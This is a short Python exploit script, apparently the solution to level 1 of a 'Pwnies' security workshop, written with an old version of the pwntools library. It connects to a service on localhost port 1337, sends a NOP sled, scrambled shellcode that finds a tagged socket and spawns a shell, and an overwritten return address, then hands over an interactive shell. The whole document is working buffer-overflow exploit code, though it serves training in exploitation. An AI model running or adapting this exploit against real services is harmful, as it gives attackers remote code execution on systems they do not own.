#!/usr/bin/env python

# Pwnies workshop server level 1

import sys, socket
from pwn import *
from pwn.i386.linux import *
import time

sock = remote('localhost', 1337, timeout = 120)
sock.recvuntil('Your output to my input? Do your best!\n')

tag = random32()
# Scramble it because it contains a newline
shellcode = scramble(asm(findtagsh(tag)), avoid = '\x00\n')

eip = p32(0x0804a080)
sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
time.sleep(0.1)
sock.send(p32(tag))
time.sleep(0.1)
sock.interactive()
